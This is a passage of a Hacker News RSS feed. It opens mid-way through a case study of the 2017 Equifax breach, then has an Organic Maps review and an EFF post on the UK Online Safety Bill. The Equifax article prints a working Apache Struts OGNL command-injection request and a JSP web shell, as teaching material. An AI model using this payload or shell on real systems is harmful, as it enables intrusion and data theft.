href="https://github.com/rapid7/metasploit-framework/blob/1378bfbfc71e5c5a86678b80a29d84190b87185a/modules/exploits/multi/http/struts2_content_type_ognl.rb">exploit</a>.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td><pre><span>GET</span> <span>/struts2-showcase/</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>127.0.0.1</span>
<span>Content-Type</span><span>:</span> <span>%{</span>
<span>    (#_='multipart/form-data').</span>
<span>    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span>
<span>    (#_memberAccess?</span>
<span>    (#_memberAccess=#dm):</span>
<span>    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).</span>
<span>    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span>
<span>    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</span>
<span>    (#context.setMemberAccess(#dm)))).</span>
<span>    (#cmd=@org.apache.struts2.ServletActionContext@getRequest().getHeader('X-kKph')).</span>
<span>    (#os=@java.lang.System@getProperty('os.name')).</span>
<span>    (#cmds=(#os.toLowerCase().contains('win')?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).</span>
<span>    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())</span>
<span>  }</span>
<span>X-kKph</span><span>:</span> <span>whoami</span>
</pre></td></tr></tbody></table></code></p></div><p>Equifax responded by committing to patch all affected applications within 48 hours. They also implemented a detection rule within <a href="https://www.snort.org/">Snort</a>, their Network Intrusion Detection System (NIDS) and conducted a filesystem scan to identify all systems with a vulnerable version of Apache Struts.</p><p>However, one application fell through the cracks, the Automated Consumer Interview System (ACIS). It was a legacy application built in the 1970s that customers used to dispute incorrect credit information. In May 2017, attackers discovered that ACIS was still vulnerable, allowing them to take control of a web server.</p><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/ACIS.png"><img data-src="/assets/img/how-equifax-was-breached-in-2017/ACIS.png" alt="The Automated Consumer Interview System (ACIS)" data-proofer-ignore="" src="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/ACIS.png"></a> <em>The Automated Consumer Interview System (ACIS)</em></p><h3 id="persistence"><span>Persistence</span><a href="#persistence"><i></i></a></h3><p>Shortly after gaining initial access on ACIS, the attackers dropped Web Shells to maintain their foothold on systems. These Web Shells provided a means for the attackers to interact with the system without the need to repeatedly exploit the Apache Struts vulnerability.</p><p>Here’s an example of a basic Web Shell, allowing anyone to execute arbitrary commands by passing them as the “cmd” parameter in HTTP requests.</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>&lt;%@ page </span><span>import=</span><span>"java.io.*"</span> <span>%&gt;</span>
<span>&lt;%</span>
    <span>String</span> <span>cmd</span> <span>=</span> <span>request</span><span>.</span><span>getParameter</span><span>(</span><span>"cmd"</span><span>);</span>
    <span>if</span> <span>(</span><span>cmd</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>Process</span> <span>p</span> <span>=</span> <span>Runtime</span><span>.</span><span>getRuntime</span><span>().</span><span>exec</span><span>(</span><span>cmd</span><span>);</span>
        <span>DataInputStream</span> <span>inputstream</span> <span>=</span> <span>new</span> <span>DataInputStream</span><span>(</span><span>p</span><span>.</span><span>getInputStream</span><span>());</span>
        <span>String</span> <span>line</span><span>;</span>
        <span>while</span> <span>((</span><span>line</span> <span>=</span> <span>inputstream</span><span>.</span><span>readLine</span><span>())</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            <span>out</span><span>.</span><span>println</span><span>(</span><span>line</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>%&gt;</span>
</pre></td></tr></tbody></table></code></p></div><h3 id="credential-access"><span>Credential Access</span><a href="#credential-access"><i></i></a></h3><p>ACIS, like any other application, relied on a database, but it didn’t store a significant amount of personal information because it was only used by a small number of clients at Equifax. The attackers continued their search and eventually discovered a mounted NFS share on the web server. This file share contained notes and configuration files used by Equifax engineers, in which they found many database credentials.</p><h3 id="lateral-movement--collection"><span>Lateral Movement &amp; Collection</span><a href="#lateral-movement--collection"><i></i></a></h3><p>There was no segmentation between the legacy system and the rest of Equifax’s infrastructure, making it possible for the attackers to access databases from other Equifax systems. With the credentials found on the file share, they were able to connect and execute queries on 48 different databases. They quickly found a table containing personal identifiable information (PII) and began collecting the data.</p><h3 id="exfiltration"><span>Exfiltration</span><a href="#exfiltration"><i></i></a></h3><p>The customer’s data was divided into multiple compressed files of 10&nbsp;MB each and placed on the web servers in a publicly accessible directory. Gradually, the attackers exfiltrated the data by making HTTP requests with <code>wget</code> from multiple locations to retrieve the contents of these files. This approach was used to minimize the chances of triggering an alert.</p><h2 id="how-it-was-detected"><span>How It Was Detected</span><a href="#how-it-was-detected"><i></i></a></h2><p>During the month of July 2017, 76 days after the start of the attack, Equifax realized that their Network Intrusion Detection System (NIDS) had an expired SSL certificate, preventing them from decrypting and monitoring traffic for the ACIS environment. Immediately after uploading the SSL certificate, the security engineers received multiple alerts regarding suspicious requests coming from IP addresses in China.</p><p>Equifax initiated a thorough investigation, revealing that the filesystem scan, intended to identify systems with a vulnerable version of Apache Struts, had been executed in the incorrect directory within the ACIS environment, leaving those systems unknowingly vulnerable since March 2017. Simultaneously, several web shells were discovered on these servers, and finally they discovered that data being exfiltrated by attackers contained personal identifiable information (PII).</p><p>Following these discoveries, ACIS was promptly shut down as an emergency action to halt the cyberattack.</p><p>During the month of August 2017, Equifax engaged the firm Mandiant to conduct a forensic investigation. By retracing all the steps of the attackers, they discovered that the attackers had successfully exfiltrated data from 163 million customers before being stopped by the shutdown of the ACIS system.</p><h2 id="conclusion"><span>Conclusion</span><a href="#conclusion"><i></i></a></h2><p>The Equifax data breach from 2017 stands out as one of the largest data breaches in history, impacting millions of individuals. It is the result of several mistakes made by Equifax:</p><ul><li>Insufficient knowledge of their legacy systems.</li><li>Poor password storage practices.</li><li>Lack of rigor in the patching process.</li><li>Lack of network segmentation.</li><li>Lack of Host-Based Intrusion Detection System (HIDS)</li><li>Lack of alerting when security tools fail.</li></ul><p>By learning from these errors, organizations can better protect sensitive data and prevent similar incidents in the future.</p><h3 id="sources"><span>Sources</span><a href="#sources"><i></i></a></h3><ul><li><a href="https://oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf">The Equifax Data Breach | Oversight and Government Reform</a></li><li><a href="https://www.hsgac.senate.gov/wp-content/uploads/imo/media/doc/FINAL%20Equifax%20Report.pdf">How Equifax Neglected Cybersecurity and Suffered a Devastating Data Breach | United States Senate</a></li></ul><h3 id="techniques"><span>Techniques</span><a href="#techniques"><i></i></a></h3><p>The <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> techniques used by the attackers throughout the data breach:</p><ul><li>Initial Access<ul><li><a href="https://attack.mitre.org/techniques/T1190/">T1190 | Exploit Public-Facing Application</a></li></ul></li><li>Persistence<ul><li><a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003 | Server Software Component: Web Shell</a></li></ul></li><li>Credential Access<ul><li><a href="https://attack.mitre.org/techniques/T1552/001/">T1552.001 | Unsecured Credentials: Credentials In Files</a></li></ul></li><li>Collection<ul><li><a href="https://attack.mitre.org/techniques/T1039/">T1039 | Data from Network Shared Drive</a></li><li><a href="https://attack.mitre.org/techniques/T1560/">T1560 | Archive Collected Data</a></li></ul></li><li>Exfiltration<ul><li><a href="https://attack.mitre.org/techniques/T1030/">T1030 | Data Transfer Size Limits</a></li></ul></li></ul><p><a href="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/pixel.png"><img data-src="/assets/img/how-equifax-was-breached-in-2017/pixel.png" alt="p" data-proofer-ignore="" src="https://blog.0x7d0.dev/assets/img/how-equifax-was-breached-in-2017/pixel.png"></a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Organic Maps: An open-source maps app that doesn't suck (280 pts)]]></title>
            <link>https://hardfault.life/p/organic-maps-review</link>
            <guid>37592712</guid>
            <pubDate>Thu, 21 Sep 2023 02:54:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://hardfault.life/p/organic-maps-review">https://hardfault.life/p/organic-maps-review</a>, See on <a href="https://news.ycombinator.com/item?id=37592712">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>A couple weeks ago while perusing Hacker News, I came across an open-source maps app
called <a href="https://organicmaps.app/">Organic Maps</a>. Proudly billing itself as privacy-focused and
open-source, Organic Maps’ website claims that it is “one of a few applications
nowadays that supports 100% of features without an active internet connection.”</p>
<h2>A World’s Worth Of Doubts</h2>
<p>Map apps are complicated. They must handle tons and tons of road
data. That data has to be accurate - even the most complex interchanges must be
charted correctly. That data needs to be kept up-to-date with information about
closures and other conditions. The routing algorithm has to be effective enough
to get the user to their destination in a safe and timely manner. It also can’t
just sit there saying “recalculating” for minutes on end every time you make a
wrong turn.</p>
<p>Google Maps, Apple Maps, and Waze have elevated the average person’s expectations for a maps app.
15 years ago, a little Garmin GPS mounted to your windshield would give
simple “turn left, turn right” commands using data loaded to an SD card. Today,
a maps app must know if there is traffic ahead, and re-route you accordingly.
It must know which lane(s) you need to use to make a turn. It must know if
there is a state trooper hiding around the corner with a radar gun. It must
know about speed cameras, stalled vehicles, and construction, and all of this
data must be received in real time… right?</p>
<h2>Organic Maps Under Pressure</h2>
<p>I had an emergency last week that requried me to drive more than 300 miles into
the rural Midwest with my fiancee. Having learned of this emergency mere minutes
after reading about Organic Maps, I decided to install the app and put it to
the test on this sudden road trip.</p>
<p>My first stop was downtown Chicago, where I would pick up my fiancee before
leaving the city. I didn’t need the app for this part of the drive, but I
figured it would make a good sanity check. Thankfully, Organic Maps gave me a
sane route that used the interstate and major streets competently.</p>
<p>I was pleased initially, but then I looked at its ETA: 4 minutes! To drive 5
miles! In Chicago! As it turns out, Organic Maps has no traffic data. I already
felt like I had made a mistake by even giving this thing a try. If it doesn’t
know about traffic, then surely
it will be worthless in one of the largest and most congested cities in the
United States!</p>
<p>I opened Google Maps to compare. Google happily presented me with
long stretches of red, indicating the heavy traffic that I knew was there. It
estimated that I would take 14 minutes to arrive downtown (it was right). Yet,
Google chose the same route as Organic Maps. <strong>Google’s traffic data offered me
a much more accurate arrival time, but Google Maps couldn’t actually get me to my
destination faster than Organic Maps.</strong></p>
<p>As it turns out, this wasn’t a fluke. Google Maps and Waze altered our
expectations for a map app’s capabilities, without actually getting
us to our destinations faster. <a href="https://trid.trb.org/view/1495267">This study</a> indicates that modern maps apps
haven’t magically gotten rid of traffic jams, though they have managed to clog up
local streets that didn’t see heavy traffic before. Other sources agree with
this conclusion, including <a href="https://citymonitor.ai/community/neighbourhoods/google-maps-local-traffic">this article from City Monitor</a> that cites some
fascinating UK Department of Transport data. The Atlantic also has
<a href="https://www.theatlantic.com/technology/archive/2018/03/mapping-apps-and-the-price-of-anarchy/555551/">a great writeup</a> on the topic.
Even the most clever of traffic-aware apps can’t get you to your destination a
whole lot faster than a “dumb” app. Traffic is sort of like
energy: you can move it around, but you can’t get rid of it.</p>
<h2>The First Drive</h2>
<p>My impression of Organic Maps immediately improved when I started driving. It
talks! It knows exit numbers! It can tell you which lanes to use! Sure, it isn’t
as polished as Google Maps, but all of the functionality is present. The UI is
high-contrast and easy to read, although I wish the text showing exit
numbers/street names was a little bigger. When you’re simply on the road and
following directions, Organic Maps feels every bit as intuitive as Google Maps.</p>
<p>As my fiancee and I prepared to set off into the boonies, I plugged in the address of our
hotel. About 45 seconds later, Organic Maps returned the 300-mile route to
our destination. It can take a lot longer to calculate longer routes using your
phone’s processor instead of a huge cloud server. It didn’t really bother me
though; 45 seconds is nothing compared to the 6-hour trip ahead. If that’s the
cost of using a maps app that doesn’t spray your personal data all over the
internet, I’ll pay it.</p>
<h2>Heading Into The Boonies</h2>
<p>This drive is familiar to me. As a child, I saw these same roads drift by from
the backseat of a minivan. This was before smartphones and tablets
were in the hands of every child in the country, so I actually paid
attention to the road signs, the condition of each highway, and the
subtle changes in the natural environment. I know those long stretches of the
rural Midwest like a child knows their hometown, through a mental map as vivid
as it is inaccurate.</p>
<p>As we sliced through miles of picturesque nothingness, Organic Maps blended
seamlessly into the background. As interstates gave way to state numbered highways, Organic Maps’
charmingly robotic voice prompted me a couple thousand feet in advance of each
turn. As state numbered highways gave way to county roads, Organic Maps
avoided dirt roads that would look like shortcuts to the uninformed. When the
sun fell below the horizon, Organic Maps switched to a dark mode that prevented
my phone’s screen from blinding me as a drove.</p>
<p>Organic Maps was at its best on this long drive. After I stopped for gas in
a town with no cell service, I had no trouble getting my maps back. Organic
Maps doesn’t need an internet connection to route you to your destination. This
no-network-necessary approach means that you don’t have to fear losing your
route when cell service isn’t available. This feature alone is enough reason to
keep it installed on your phone, just in case you need it.</p>
<h2>Putting a Town On The Map</h2>
<p>Organic Maps performed exceptionally well while driving through rural America,
but once I arrived at my destination, it struggled. This
town isn’t small (technically it qualifies as a city!), and it’s well-known within
its state, yet there were dozens of businesses missing from the map. Many of the
missing businesses weren’t new either - at least a few
have been around for over a decade, yet somehow never made it into
Organic Maps’ database. I could only find my hotel by address; Organic Maps
knew the address, but didn’t know that there was a hotel there.</p>
<p>Organic Maps uses an open map database called <a href="https://www.openstreetmap.org/">OpenStreetMap</a>. Although
OpenStreetMap has very accurate data about streets, addresses, and highways,
its knowledge of what’s actually located at any given address is spotty at best.
Thankfully, Organic Maps has a half-solution to this problem: contribute OpenStreetMap data
yourself! Organic Maps lets you contribute data to OpenStreetMap. Simply press
and hold where the business should be, tap “add a place to the map,” and fill
out the form. I ended up spending an hour of downtime adding information about
various restaurants, libraries, museums, and stores around town. It
would take far longer to add every business in the area, but it’s a good start.
I love being able to contribute to OpenStreetMap, and Organic Maps makes it easy
to do that.</p>
<h2>Fumbling The ITR</h2>
<p>If you need to come into downtown Chicago from the east, there are two ways you
can go. The expensive way is to take I-90 via the Indiana Toll Road (“ITR” for
short) and Chicago Skyway. The cheap way is to take I-94 south to the I-80/I-294
interchange. Both routes eventually put you on <a href="https://en.wikipedia.org/wiki/Dan_Ryan_Expressway">the Dan Ryan</a>, a 14-lane
behemoth heading straight into the heart of the city. Just writing about the
ITR makes my skin crawl, and apparently it also makes Organic Maps upset.</p>
<p>Nearing the end of the drive home, as my impending merge onto the ITR loomed,
Organic Maps did something strange. It told me to take the wrong ramp, which
would have put me on the ITR heading west, then make a U-turn and head
east. I know this drive well enough to know it was asking me to do something
physically impossible. So, I did what I had been trying to avoid the entire
weekend: I disobeyed Organic Maps. I took the correct ramp, Organic Maps quickly
recalculated, and everything went back to normal.</p>
<p>I tried re-creating this problem a couple days later, and Organic Maps did it
again! Here is the incorrect route:</p>
<p><img src="https://hardfault.life/public/organic-maps-review/organic-bad-route.png" alt="Screenshot of the Organic Maps app showing an incorrect route"></p>
<p>Notice the little kink in the route near the top-right corner of the image -
that’s a U-turn that doesn’t actually exist. Even more bizarre is that
the <a href="https://www.openstreetmap.org/">OpenStreetMap</a> website gets the correct route:</p>
<p><img src="https://hardfault.life/public/organic-maps-review/osm-correct-route.png" alt="Screenshot of the OpenStreetMap web app showing the correct route"></p>
<p>This shook my confidence in Organic Maps, but after more than 1000 miles of
otherwise worry-free routing, this seemed to be a one-off bug. I created an
<a href="https://github.com/organicmaps/organicmaps/issues/5983">issue on GitHub</a> and the developers responded swiftly. Unfortunately, it can
take a few weeks for an OpenStreetMap update to get pushed out, so now I
(and anyone else driving westbound into Chicago) must wait for the new, more
accurate map data.</p>
<h2>Returning Home</h2>
<p>Organic Maps has proven itself to be a competent alternative to Google Maps,
at least for my purposes. Its UI is simple and intuitive. Organic Maps gets me
to my destinations as quickly and safely as Google Maps, even though it doesn’t
have Google’s extensive traffic data. Organic Maps isn’t operated by megacorp
trying to make you buy things.</p>
<p>Organic Maps is certainly not for everyone. If you are constantly
running out of storage space on your phone, Organic Maps’ need to download
hundreds of megabytes of map data onto your phone will be a non-starter. On the
other hand, its offline map storage means that it doesn’t need an internet
connection to get you to your destination.</p>
<p>Incorrect or missing businesses are the biggest inconvenience of using Organic Maps.
I occasionally switch back to Google Maps when a business or address is missing.
In this regard, Organic Maps can only improve if people use it. If your destination
is missing, add it. If some information is out of date, update it. I would
strongly encourage anyone to try Organic Maps for a week or two. I gave it an
honest chance, and it made a lasting impression.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK Parliament undermined the privacy, security, freedom of all internet users (603 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users</link>
            <guid>37592699</guid>
            <pubDate>Thu, 21 Sep 2023 02:51:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users">https://www.eff.org/deeplinks/2023/09/today-uk-parliament-undermined-privacy-security-and-freedom-all-internet-users</a>, See on <a href="https://news.ycombinator.com/item?id=37592699">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p><span>The U.K. Parliament </span><a href="https://www.reuters.com/world/uk/uks-online-safety-bill-passed-by-parliament-2023-09-19/"><span>has passed the Online Safety Bill</span></a><span> (OSB), which says it will make the U.K. “the safest place” in the world to be online. In reality, the OSB will lead to a much more censored, locked-down internet for British users. The bill could empower the government to undermine not just the privacy and security of U.K. residents, but <a href="https://www.eff.org/deeplinks/2021/08/if-you-build-it-they-will-come-apple-has-opened-backdoor-increased-surveillance">internet users worldwide</a>.&nbsp;</span></p>
<h3><b>A Backdoor That Undermines Encryption</b></h3>
<p><span>A clause of the bill allows Ofcom, the British telecom regulator, to serve a notice requiring tech companies to scan their users–all of them–for child abuse content.This would&nbsp;affect&nbsp;even messages and files that are end-to-end encrypted to protect user privacy. As enacted, the OSB allows the government to force companies to build technology that can scan regardless of encryption–in other words, build a backdoor.&nbsp;</span></p>
<p><span>These types of </span><a href="https://www.eff.org/deeplinks/2019/11/why-adding-client-side-scanning-breaks-end-end-encryption"><span>client-side scanning systems</span></a><span> amount to </span><a href="https://arxiv.org/abs/2110.07450"><span>“Bugs in Our Pockets,”</span></a><span> and a group of leading computer security experts has reached the same conclusion as EFF–they undermine privacy and security for everyone. That’s why EFF has </span><a href="https://www.eff.org/deeplinks/2023/07/uk-government-very-close-eroding-encryption-worldwide"><span>strongly opposed the OSB</span></a><span> for </span><a href="https://www.eff.org/deeplinks/2022/08/uks-online-safety-bill-attacks-free-speech-and-encryption"><span>years</span></a><span>.&nbsp;</span></p>
<p><span>It’s a basic human right to have a private conversation. This right is even more important for the most vulnerable people. If the U.K. uses its new powers to scan people’s data, lawmakers will damage&nbsp;the security people need to protect themselves from harassers, data thieves, authoritarian governments, and others. Paradoxically, U.K. lawmakers have created these new risks in the name of online safety.&nbsp;</span></p>
<p><span>The U.K. government has </span><a href="https://www.eff.org/deeplinks/2023/09/uk-government-knows-how-extreme-online-safety-bill"><span>made some recent statements</span></a><span> </span><span>indicating that it actually realizes that getting around end-to-end encryption isn’t compatible with protecting user privacy. But given the text of the law, neither the government’s private statements to tech companies, nor its weak public assurances, are enough to protect the human rights of British people or internet users around the world.&nbsp;</span></p>
<h3><b>Censorship and Age-Gating</b></h3>
<p><span>Online platforms will be expected to remove content that the U.K. government views as inappropriate for children. If they don’t, they’ll face heavy penalties. The problem is, in the U.K. as in the U.S., </span><a href="https://www.eff.org/deeplinks/2023/08/us-government-about-control-speech-online-protect-kids"><span>people do not agree about what type of content is harmful for kids</span></a><span>. Putting that decision in the hands of government regulators will lead to politicized censorship decisions.&nbsp;</span></p>
<p><span>The OSB will also lead to </span><a href="https://www.eff.org/deeplinks/2023/03/age-verification-mandates-would-undermine-anonymity-online"><span>harmful age-verification systems</span></a><span>. This violates fundamental principles about anonymous and simple access that has existed since the beginning of the Internet. You shouldn’t have to show your ID to get online. Age-gating systems meant to keep out kids invariably lead to adults losing their rights to private speech, and anonymous speech, which is sometimes necessary.&nbsp;</span></p>
<p><span>In the coming months, we’ll be watching what type of regulations the U.K. government publishes describing how it will use these new powers to regulate the internet. If the regulators claim their right to require the creation of dangerous backdoors in encrypted services, we expect encrypted messaging services to </span><a href="https://techcrunch.com/2023/06/27/an-encryption-exodus-looms-over-uks-online-safety-bill/"><span>keep their promises</span></a><span> and withdraw from the U.K. if that nation’s government&nbsp;compromises their ability to protect other users.&nbsp;</span></p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
    </channel>
</rss>